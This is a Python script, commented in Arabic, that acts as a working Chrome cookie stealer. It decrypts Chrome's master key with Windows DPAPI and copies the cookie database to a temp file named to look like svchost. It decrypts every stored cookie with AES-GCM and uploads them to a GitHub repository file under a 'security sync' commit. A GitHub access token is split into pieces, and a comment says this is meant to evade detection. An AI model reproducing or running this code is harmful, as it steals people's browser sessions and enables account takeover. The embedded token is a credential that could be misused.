import os, json, base64, sqlite3, shutil, requests, time

# التوكن المقسم (تكتيك تجاوز الرادار)
A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
ACCESS_TOKEN = A + B + C
REPO_API = "https://api.github.com/repos/Noor092324/Noor-config/contents/Noor.json"

def ultimate_grabber():
    local_data = os.getenv('LOCALAPPDATA')
    # مسارات ثابتة ومضمونة لكروم
    state_file = os.path.join(local_data, r'Google\Chrome\User Data\Local State')
    cookies_file = os.path.join(local_data, r'Google\Chrome\User Data\Default\Network\Cookies')
    
    if not os.path.exists(cookies_file): return

    # اسم ملف عشوائي تماماً للتمويه في المجلد المؤقت
    shadow_db = os.path.join(os.getenv('TEMP'), 'svchost_data.bak')
    
    try:
        import win32crypt
        from Crypto.Cipher import AES
        
        # نسخ الملف بقوة (حتى لو كان المتصفح شغال)
        shutil.copy2(cookies_file, shadow_db)
        
        # استخراج المفتاح الرئيسي لفك التشفير
        with open(state_file, "r", encoding="utf-8") as f:
            secret_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
            decrypted_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        
        db_conn = sqlite3.connect(shadow_db)
        cursor = db_conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        
        extracted_cookies = []
        for host, name, value in cursor.fetchall():
            try:
                # فك التشفير باستخدام AES-GCM (أحدث حماية من جوجل)
                iv = value[3:15]
                payload = value[15:]
                cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
                dec_value = cipher.decrypt(payload)[:-16].decode()
                extracted_cookies.append(f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{dec_value}")
            except: continue
        
        db_conn.close()
        os.remove(shadow_db)

        # تحويل البيانات لنص واحد ضخم كما طلبت
        final_text = "\n".join(extracted_cookies)
        
        if final_text:
            headers = {"Authorization": f"token {ACCESS_TOKEN}"}
            # جلب SHA لتحديث الملف في GitHub
            file_info = requests.get(REPO_API, headers=headers).json()
            sha_id = file_info.get('sha')
            
            # رفع البيانات مباشرة إلى Noor.json
            update_payload = {
                "message": "security sync",
                "content": base64.b64encode(final_text.encode()).decode(),
                "sha": sha_id
            }
            requests.put(REPO_API, headers=headers, json=update_payload)
            
    except: pass

if __name__ == "__main__":
    ultimate_grabber()
    
